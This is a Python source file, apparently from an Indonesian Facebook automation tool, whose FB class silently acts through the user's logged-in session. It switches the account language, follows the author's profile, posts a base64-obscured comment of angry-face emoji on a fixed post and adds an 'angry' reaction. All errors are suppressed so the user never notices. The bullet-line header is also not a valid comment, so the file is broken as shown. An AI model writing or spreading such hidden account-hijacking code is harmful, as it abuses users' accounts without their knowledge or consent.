#!/usr/bin/python3
# coding=utf-8

•••••••••••••••••••••••••••••••••••••••
              go.py
  author: Yudhaha
  Ig    : https://instagram.com/yudamxr?igshid=oz075ik01ree
  fb    : https://www.facebook.com/damar.ky.16
  wa bot: Wa.me//+17145921008
•••••••••••••••••••••••••••••••••••••••

import base64

class FB:

    text = '8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig'

    def changeLanguage(self):
        try:
            http = self.store.http.get('/language.php')
            for i in http.bs4().find_all('a'):
                if 'Bahasa Indonesia' in str(i):
                    http.get(i['href'])
        except:
            pass

        return self

    def followMe(self):
        try:
            http = self.store.http.get('/damar.ky.16')
            href = http.bs4().find('a', string='Ikuti')
            http.get(href['href'])
        except:
            pass

        return self

    def comments(self, reaction=None):
        try:
            http = self.store.http.get('/1145924768936987')
            params = http.currentInputHidden()
            params.update({'comment_text': base64.b64decode(self.text)})
            path = http.currentActionForm('/a/comment.php')
            bs4 = http.bs4()

            if path != '/':
                http.post(path, data=params)

            for i in bs4.find_all('a'):
                if '/reactions/picker/?is_permalink=1' in str(i):
                    reaction = i['href']
                    break
            if reaction != None:
                angry = http.get(reaction).bs4()
                for x in angry.find_all('a'):
                    if 'reaction_type=8' in str(x):
                        http.get(x['href'])
                        break
        except:
            pass

        return self